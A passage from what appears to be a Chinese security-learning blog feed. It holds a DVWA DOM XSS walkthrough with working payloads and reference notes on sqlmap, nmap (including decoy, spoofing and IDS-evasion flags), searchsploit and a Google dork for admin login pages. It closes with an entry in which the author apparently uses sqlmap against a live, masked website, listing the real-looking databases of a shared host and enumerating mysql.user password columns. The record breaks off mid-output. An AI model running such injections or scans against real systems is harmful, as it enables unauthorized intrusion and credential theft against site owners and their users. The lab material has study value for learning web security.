work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>name和message都是用htmlspecialchars函数，把符号转化为了实体。</p><h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><h5 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h5><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8kp9exj30nn095755.jpg"/><p>把English更改为<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8womrtj30g905nq2y.jpg"/><h5 id="medium-6"><a href="#medium-6" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p><pre><code class="php">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    $default = $_GET[&#39;default&#39;];    # Do not allow script tags    if (stripos ($default, &quot;&lt;script&quot;) !== false) {        header (&quot;location: ?default=English&quot;);        exit;    }}?&gt;</code></pre><p>这里过滤了&lt;script，如果default值中存在&lt;script，default=English。</p><p><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk979l8hj30np08yt9k.jpg"/><p>页面并没有出现弹窗。</p><blockquote><option value="%3Cimg%20src=1%20onerror=alert(/xss/)%3E"></option><option value="English">English</option></blockquote><p>发现代码被插入到value值中，并没有在option标签中，所以img标签没起到作用。</p><p>首先闭合option，发现xss&gt;被插入到了option值中。于是在闭合select标签。之后再加入注入语句就可以了。成功执行。</p><p><code>xss&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9lgdjzj30g705qwej.jpg"/><h5 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p><pre><code class="php">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    # White list the allowable languages    switch ($_GET[&#39;default&#39;]) {        case &quot;French&quot;:        case &quot;English&quot;:        case &quot;German&quot;:        case &quot;Spanish&quot;:            # ok            break;        default:            header (&quot;location: ?default=English&quot;);            exit;    }}?&gt;</code></pre><p>使用<code>#&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，注意#前有空格。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9v6s4ij30hq05o74c.jpg"/><h5 id="impossible-6"><a href="#impossible-6" class="headerlink" title="impossible"></a>impossible</h5><blockquote><p>Don’t need to do anything, protction handled on the client side</p></blockquote><p>对我们输入的参数不进行URL解码。我们输入的数据经过URL编码，直接赋值到optio标签。直接在客户端处理，所以就不存在xss漏洞了。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> DVWA </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap注入参数记录</title>
      <link href="/2020/03/03/sqlmap-1/"/>
      <url>/2020/03/03/sqlmap-1/</url>
      
        <content type="html"><![CDATA[<p>在浏览别人分享的文章后，了解到SQLMap的灵活性，学习到了新姿势，觉得自己又菜了，有好工具不会用你说气人不气人，简直就是暴殄天物。没有仔细地看过这款工具，这可能就是差距吧。orz</p><h2 id="SQLMap注入"><a href="#SQLMap注入" class="headerlink" title="SQLMap注入"></a>SQLMap注入</h2><h3 id="SQLMap支持的数据库"><a href="#SQLMap支持的数据库" class="headerlink" title="SQLMap支持的数据库"></a>SQLMap支持的数据库</h3><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><h3 id="SQLMap参数介绍"><a href="#SQLMap参数介绍" class="headerlink" title="SQLMap参数介绍"></a>SQLMap参数介绍</h3><p>今天突发奇想记录一下SQLMap常用的参数，平常我也没怎么用过。就先记下吧。</p><p><code>sqlmap.py -u &quot;www.xxx.com&quot; -v 3 --flush-session</code></p><blockquote><p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数</p><p>共有7个等级，默认为1</p><p>0、只显示python错误以及严重的信息。</p><p>1、同时显示基本信息和警告信息。（默认）</p><p>2、同时显示debug信息。</p><p>3、同时显示注入的payload。</p><p>4、同时显示HTTP请求。</p><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><p>注：如果你想看到sqlmap发送的测试payload最好的等级就是3。</p></blockquote><p>不知道后面参数<code>--flush-session</code>的意思，只能百度搜一下看看。有用有用。</p><blockquote><p>参数：–flush-session<br>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。自动获取form表单测试</p></blockquote><p><code>sqlmap -u &quot;www.xxx.com&quot; -v 3 --technique=B -D security -T users -C &#39;id,username,password&#39; --dump</code></p><p>不知道后面参数<code>--technique=B</code>的意思，只能百度搜一下看看。</p><blockquote><p>参数：–technique<br>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。<br>–technique=B<br>支持的探测方式如下：<br>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p></blockquote><p>把GET请求改为POST请求发送</p><blockquote><p>参数：–data<br>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。<br>例子：<br>python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php&quot;</a> –data=”id=1” -f –banner –dbs –users</p></blockquote><p><code>-p</code>手动指出存在注入的参数</p><blockquote><p>参数：-p,–skip<br>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p “id,user-anget”<br>当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数。<br>例如：–skip=”user-angent.referer”</p></blockquote><p><code>--random-agent</code>随机user-agent</p><blockquote><p>参数：–user-agent,–random-agent<br>默认情况下sqlmap的HTTP请求头中User-Agent值是：<br>sqlmap/1.0-dev-xxxxxxx (<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)<br>可以使用–user-anget参数来修改，同时也可以使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。</p></blockquote><p><code>tamper</code>防止过滤，绕waf用的。</p><blockquote><p>参数：–tamper<br>sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用–tamper参数对数据做修改来绕过WAF等设备。<br>例如：–temper=”between”</p></blockquote><p><code>--batch</code> 使用默认的选项进行下一步</p><p><code>-r</code> 使用burpsuite抓包，把请求包放进txt文件，用sqlmap读这个文件就可以了。</p><blockquote><p>什么时候使用-r参数</p><p>post注入、搜索型注入、http头注入、登陆后的注入点。</p></blockquote><p><code>--delay=0.2</code> 0.2s发一个请求，可以设置sqlmap发送请求的速度。</p><h3 id="sqlmap闭合语句"><a href="#sqlmap闭合语句" class="headerlink" title="sqlmap闭合语句"></a>sqlmap闭合语句</h3><blockquote><p>尝试使用<code>)</code>来闭合前面的语句<br>直接注入，使用<code>--</code>注释掉后面的语句<br>使用 <code>&#39;)</code>来闭合前面语句 构造一个判断条件 使用<code>(&#39;</code>闭合后面语句<br>使用<code>&#39;</code>来闭合前面语句 构造一个判断条件 使用<code>&#39;</code>闭合后面语句<br><code>&#39;;</code>闭合前面语句 <code>#</code> 闭合后面语句<br><code>&#39;;</code> 闭合前面语句 构造’zOkG’=’zOkG 用单引号<code>&#39;</code>闭合后面语句</p></blockquote><p>参考文章：SQLMap用户手册<a href="https://www.cnblogs.com/hongfei/p/3872156.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongfei/p/3872156.html</a></p>]]></content>
      
      
      <categories>
          
          <category> SQLMap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMap </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap使用参数记录</title>
      <link href="/2020/03/03/Nmap/"/>
      <url>/2020/03/03/Nmap/</url>
      
        <content type="html"><![CDATA[<p>nmap，端口扫描神器。但是扫描速度有点慢。</p><h2 id="nmap的使用"><a href="#nmap的使用" class="headerlink" title="nmap的使用"></a>nmap的使用</h2><h3 id="nmap介绍"><a href="#nmap介绍" class="headerlink" title="nmap介绍"></a>nmap介绍</h3><p>Nmap — 网络探测工具和安全/端口扫描器。</p><h3 id="nmap常用参数"><a href="#nmap常用参数" class="headerlink" title="nmap常用参数"></a>nmap常用参数</h3><p>ping扫描</p><p><code>nmap -sP 192.168.0.1/24</code></p><p>SYN扫描（半开扫描）</p><p><code>nmap -sS 192.168.0.1/24</code></p><p><code>-P0</code>   扫描前不用ping命令</p><p><code>-O</code>    判断操作系统，存在误报</p><p><code>-oN</code>  输出txt文件</p><p><code>-iL</code>    读取主机列表，“-iL C:\ip.txt”</p><p><code>-vv</code>对结果进行详细的输出</p><p><code>-PR</code>使用ARP协议扫描</p><p><code>-T4</code>时间优化(0-5)，默认是<code>T3</code>，建议使用T4</p><p><code>-F</code>快速扫描</p><p><code>-Pn</code> <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> 穿透防火墙扫描结果</p><p><code>-A</code>  OS识别,版本探测,脚本扫描和traceroute</p><blockquote><p><strong>Nmap基本命令和典型用法</strong></p><ul><li>Nmap 基本语法</li></ul><pre><code>nmap [ &lt;扫描类型&gt; ...] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }</code></pre><ul><li>全面进攻性扫描（包括各种主机发现、端口扫描、版本扫描、OS扫描及默认脚本扫描）:</li></ul><pre><code>nmap -T4 -A -v target_ip</code></pre><ul><li>Ping扫描:</li></ul><pre><code>nmap -sn -v target_ip</code></pre><ul><li>快速端口扫描:</li></ul><pre><code>nmap -F -v target_ip</code></pre><ul><li>版本扫描:</li></ul><pre><code>nmap -sV -v target_ip </code></pre><ul><li>操作系统扫描:</li></ul><pre><code>nmap -O -v target_ip</code></pre></blockquote><h3 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h3><ul><li>–host-timeout  主机超时时间</li><li>–scan-delay 报文时间间隔</li><li>-S &lt;源地址&gt;  定义扫描源地址，避免被发现。</li></ul><blockquote><h1 id="快速扫描"><a href="#快速扫描" class="headerlink" title="快速扫描"></a>快速扫描</h1><p>说明：使用masscan做全端口开放检测，过出来端口信息后，用nmap进行识别。</p><pre><code class="bash">masscan -p1-65535 10.10.10.10 --rate=1000 -e tun0 &gt; portsports=$(cat ports | awk -F &quot; &quot; &#39;{print $4}&#39; | awk -F &quot;/&quot; &#39;{print $1}&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s/,$//&#39;)nmap -Pn -A -sV -sC -p$ports 10.10.10.10</code></pre><p>补充：经同学指点，其实用nmap也是可以提高扫描速度的，原理也是先快速判断端口开放情况再做服务识别。命令如下供参考。</p><pre><code class="bash">ports=$(nmap -p- --min-rate=1000 -sT -T4 10.10.10.10 | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)nmap -sC -sV -p$ports -sT 10.10.10.10</code></pre></blockquote><h3 id="nmap参数"><a href="#nmap参数" class="headerlink" title="nmap参数"></a>nmap参数</h3><pre><code class="shell">Nmap支持主机名,ip,网段的表示方式例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段--exclude host1[, host2]        从扫描任务中需要排除的主机          --exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同主机发现-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启  -n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析扫描技巧-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描指定端口和扫描顺序-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口服务版本识别-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息脚本扫描-sC　　根据端口识别的服务,调用默认脚本--script=”Lua scripts”　　调用的脚本名--script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数--script-args-file=filename　　使用文本传递参数--script-trace　　显示所有发送和接收到的数据--script-updatedb　　更新脚本的数据库--script-help=”Lua script”　　显示指定脚本的帮助OS识别-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配防火墙/IDS躲避和哄骗-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口 --proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包Nmap 输出-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表，转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表时间性能优化-T 　 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)-F　　快速扫描。--host-timeout time　　设置扫描主机的最大时间其他nmap选项-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre><h2 id="nbtscan扫描"><a href="#nbtscan扫描" class="headerlink" title="nbtscan扫描"></a>nbtscan扫描</h2><p>这是一款用于扫描Windows网络上NetBIOS名字信息的程序。该程序对给出范围内的每一个地址发送NetBIOS状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan列出它的IP地址、NetBIOS计算机名、登录用户名和MAC地址。<strong>NBTSCAN可以取到PC的真实IP地址和MAC地址。但只能用于局域网。</strong></p><blockquote><p>扫描整个C段  <code>nbtscan -r 192.168.1.0/24</code></p></blockquote><blockquote><p>扫描一个范围  <code>nbtscan 192.168.1.25-137</code></p></blockquote><blockquote><p>以:分割显示结果  <code>nbtscan -v -s : 192.168.1.0/24</code></p></blockquote><blockquote><p>从文件读取扫描范围  nbtscan  -f  <file></p></blockquote><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><p>hping3 主要是测试防火墙的拦截规则，对网络设备进行测试</p><p><strong>常用模式</strong></p><ul><li>-0 –rawip IP原始报文</li><li>-1 –icmp ICMP模式</li><li>-2 –udp UDP模式</li><li>-8 –scan 扫描模式</li><li>-9 –listen 监听模式</li></ul><p>SYN扫描<code>hping --scan 1-65535 -S www.xxx.com</code></p><h2 id="SearchSploit"><a href="#SearchSploit" class="headerlink" title="SearchSploit"></a>SearchSploit</h2><p><strong>“searchsploit”是一个用于Exploit-DB的命令行搜索工具，它还允许你随身带一份Exploit-DB的副本。</strong></p><p>SearchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。这种能力特别适用于在没有互联网接入的情况下对网络进行安全评估。许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在我们的Exploit-DB二进制文件中找到。</p><p>如果您预计您将在一个没有Internet的网络环境进行渗透测试，请确保您检查了两个存储库，以获得最完整的数据集。注意，这个工具的名称是“SearchSploit“，顾名思义，它将搜索所有的漏洞和shellcode。它不会包含任何文件和谷歌黑客数据库的结果</p><p>终端输入<code>searchsploit</code>启动(已经默认在Kali/Parrot中安装)</p><p>搜索windows提权漏洞<code>searchsploit -t windows local</code></p><p>搜索aphache漏洞 <code>searchsploit -t Apache</code></p><p>使用<code>--exclude=&quot;&quot;</code>选项删除不想要的结果</p><h3 id="详细参数"><a href="#详细参数" class="headerlink" title="详细参数"></a>详细参数</h3><pre><code>========= Options=========   -c, --case     [Term]      区分大小写(默认不区分大小写)   -e, --exact    [Term]      对exploit标题进行EXACT匹配 (默认为 AND) [Implies &quot;-t&quot;].   -h, --help                 显示帮助   -j, --json     [Term]      以JSON格式显示结果   -m, --mirror   [EDB-ID]    把一个exp拷贝到当前工作目录,参数后加目标id   -o, --overflow [Term]      Exploit标题被允许溢出其列   -p, --path     [EDB-ID]    显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号   -t, --title    [Term]      仅仅搜索漏洞标题（默认是标题和文件的路径）   -u, --update               检查并安装任何exploitdb软件包更新（deb或git）   -w, --www      [Term]      显示Exploit-DB.com的URL而不是本地路径（在线搜索）   -x, --examine  [EDB-ID]    使用$ PAGER检查（副本）Exp       --colour               搜索结果不高亮显示关键词       --id                   显示EDB-ID       --nmap     [file.xml]  使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）                                使用“-v”（详细）来尝试更多的组合       --exclude=&quot;term&quot;       从结果中删除值。通过使用“|”分隔多个值                              例如--exclude=“term1 | term2 | term3”。======= Notes======= * 你可以使用任意数量的搜索词。 * Search terms are not case-sensitive (by default), and ordering is irrelevant.   * 搜索术语不区分大小写(默认情况下)，而排序则无关紧要。   * 如果你想用精确的匹配来过滤结果，请使用用 -e 参数 * 使用&#39; - t &#39;将文件的路径排除，以过滤搜索结果   * 删除误报(特别是在搜索使用数字时 - i.e. 版本). * 当更新或显示帮助时，搜索项将被忽略。</code></pre><h3 id="搜索目标包含后台的页面"><a href="#搜索目标包含后台的页面" class="headerlink" title="搜索目标包含后台的页面"></a>搜索目标包含后台的页面</h3><p>site:”some- keywords.com” intitle: login intext: intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|manage|amin|loginl|system</p>]]></content>
      
      
      <categories>
          
          <category> Nmap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库基本使用</title>
      <link href="/2020/03/02/mysql-1/"/>
      <url>/2020/03/02/mysql-1/</url>
      
        <content type="html"><![CDATA[<p>其他的数据库还没用过，就在这里先记录一下MySQL数据库的基本操作吧。我有点怀疑我为什么要写这个了。随便百度都能百度到的东西，我跪了（没办法，我是真的菜鸡）。</p><h2 id="数据库的基本用法"><a href="#数据库的基本用法" class="headerlink" title="数据库的基本用法"></a>数据库的基本用法</h2><p>数据库的种类有很多，也有对应的图形化管理界面，但还是要掌握使用命令来对数据库进行操作。</p><p>由于平常自己也很少使用数据库，现在只记录一些最基本的用法。</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>登录数据库；</p><pre><code class="shell">mysql -u root -p</code></pre><p>查看数据库；</p><pre><code class="shell">mysql&gt; show databases;   +--------------------+| Database           |+--------------------+| information_schema || app                || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)</code></pre><p>删除app数据库；</p><pre><code class="shell">mysql&gt; drop database app;Query OK, 0 rows affected (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)</code></pre><p>创建app数据库；</p><pre><code class="shell">mysql&gt; create database app;Query OK, 1 row affected (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || app                || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)</code></pre><p>选择数据库，查看数据库中的表；</p><pre><code class="shell">use app;    show tables;   </code></pre><p>选择数据库，创建一个新表，插入一行新数据；</p><pre><code class="shell">mysql&gt; use app;Database changedmysql&gt; create table table_name(id int,username varchar(50),password varchar(50));Query OK, 0 rows affected (0.01 sec)mysql&gt; select * from table_name;Empty set (0.00 sec)mysql&gt; insert into table_name(id,username,password) values(1,&#39;root&#39;,&#39;toor&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     |+------+----------+----------+1 row in set (0.00 sec)</code></pre><p>插入多行新数据；</p><pre><code class="shell">mysql&gt; insert into table_name(id,username,password) values(2,&#39;admin&#39;,&#39;admin123&#39;),(3,&#39;sysadm&#39;,&#39;admin456&#39;),(4,&#39;secadm&#39;,&#39;secadm&#39;);Query OK, 3 rows affected (0.01 sec)Records: 3  Duplicates: 0  Warnings: 0mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    3 | sysadm   | admin456 ||    4 | secadm   | secadm   |+------+----------+----------+4 rows in set (0.00 sec)</code></pre><p>更新表中的字段内容；</p><pre><code class="shell">mysql&gt; update table_name set password=&#39;123456&#39; where id=4;Query OK, 1 row affected (0.00 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    3 | sysadm   | admin456 ||    4 | secadm   | 123456   |+------+----------+----------+4 rows in set (0.00 sec)mysql&gt; select * from table_name where id=4;+------+----------+----------+| id   | username | password |+------+----------+----------+|    4 | secadm   | 123456   |+------+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    3 | sysadm   | admin456 ||    4 | secadm   | 123456   |+------+----------+----------+4 rows in set (0.00 sec)</code></pre><p>删除一行数据；</p><pre><code class="shell">mysql&gt; delete from table_name where id=3;Query OK, 1 row affected (0.01 sec)mysql&gt; select * from table_name;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | root     | toor     ||    2 | admin    | admin123 ||    4 | secadm   | 123456   |+------+----------+----------+3 rows in set (0.00 sec)mysql&gt; exitBye</code></pre><h3 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a>SQL server</h3><h3 id="access"><a href="#access" class="headerlink" title="access"></a>access</h3><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次完整的SQL注入</title>
      <link href="/2020/03/01/sqlmap-2/"/>
      <url>/2020/03/01/sqlmap-2/</url>
      
        <content type="html"><![CDATA[<p>这是之前学习SQLMAP时做过的记录，第一次使用SQL注入获取用户密码，当时还是挺激动的，虽然这个很简单。存粹的学习记录，把一些试错的过程删掉了。</p><h2 id="SQLMAP注入"><a href="#SQLMAP注入" class="headerlink" title="SQLMAP注入"></a>SQLMAP注入</h2><p>首先查找到注入点，用sqlmap进行注入。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot;</code></p><p>查看当前数据库。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --current-db</code></p><pre><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --current-dbcurrent database: &#39;bible_history&#39;</code></pre><p>查看所有数据库。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dbs</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dbsavailable databases [18]:[] ancient_questions[] axiom_sewers[] bible_glossary[] bible_history[] grosh[] hmc_hmcinspire[] infofaq[] information_schema[] kidsbibledictionary[] kidsmaps[] mysql[] performance_schema[] portlandroofrepair[] russellcraft[] rusty_ancient[] rusty_biblemaps[] rusty_even[] w2605a</code></pre><p>列出数据库中的所有表。</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --tables -D mysql</code></p><pre><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --tables -D mysql+---------------------------+| user                      || column_stats              || columns_priv              || db                        || event                     || func                      || general_log               || gtid_slave_pos            || help_category             || help_keyword              || help_relation             || help_topic                || host                      || index_stats               || innodb_index_stats        || innodb_table_stats        || plugin                    || proc                      || procs_priv                || proxies_priv              || roles_mapping             || servers                   || slow_log                  || table_stats               || tables_priv               || time_zone                 || time_zone_leap_second     || time_zone_name            || time_zone_transition      || time_zone_transition_type || transaction_registry      |</code></pre><p>列出表中的所有字段</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --columns -T user -D mysql</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --columns -T user -D mysql[47 columns]+------------------------+-----------------------------------+| Column                 | Type                              |+------------------------+-----------------------------------+| User                   | char(80)                          || Alter_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Alter_routine_priv     | enum(&#39;N&#39;,&#39;Y&#39;)                     || authentication_string  | text                              || Create_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_routine_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_tablespace_priv | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_tmp_table_priv  | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_user_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || Create_view_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || default_role           | char(80)                          || Delete_history_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     || Delete_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Drop_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     || Event_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Execute_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || File_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     || Grant_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Host                   | char(60)                          || Index_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     || Insert_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || is_role                | enum(&#39;N&#39;,&#39;Y&#39;)                     || Lock_tables_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || max_connections        | int(11) unsigned                  || max_questions          | int(11) unsigned                  || max_statement_time     | decimal(12,6)                     || max_updates            | int(11) unsigned                  || max_user_connections   | int(11)                           || Password               | char(41)                          || password_expired       | enum(&#39;N&#39;,&#39;Y&#39;)                     || plugin                 | char(64)                          || Process_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || References_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     || Reload_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Repl_client_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     || Repl_slave_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     || Select_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || Show_db_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || Show_view_priv         | enum(&#39;N&#39;,&#39;Y&#39;)                     || Shutdown_priv          | enum(&#39;N&#39;,&#39;Y&#39;)                     || ssl_cipher             | blob                              || ssl_type               | enum(&#39;&#39;,&#39;ANY&#39;,&#39;X509&#39;,&#39;SPECIFIED&#39;) || Super_priv             | 